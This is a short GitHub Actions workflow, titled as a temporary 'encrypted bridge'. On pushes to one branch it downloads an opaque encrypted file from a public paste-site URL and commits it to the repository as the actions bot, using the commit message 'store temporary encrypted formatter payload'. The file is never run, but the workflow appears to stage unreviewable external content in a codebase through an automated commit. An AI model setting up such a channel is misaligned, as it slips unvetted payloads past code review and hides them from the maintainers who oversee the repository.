name: Temporary Phase 1 Encrypted Bridge

on:
  push:
    branches:
      - temp/phase1-bridge-a7c9

permissions:
  contents: write

jobs:
  fetch-ciphertext:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
        with:
          ref: temp/phase1-bridge-a7c9
          persist-credentials: true
      - name: Fetch encrypted payload
        run: curl -L --fail --silent --show-error https://pastepile.com/raw/p1-pr280-public-a7c9 -o phase1-ciphertext.txt
      - name: Commit encrypted payload
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add phase1-ciphertext.txt
          git commit -m "chore: store temporary encrypted formatter payload"
          git push origin HEAD:temp/phase1-bridge-a7c9
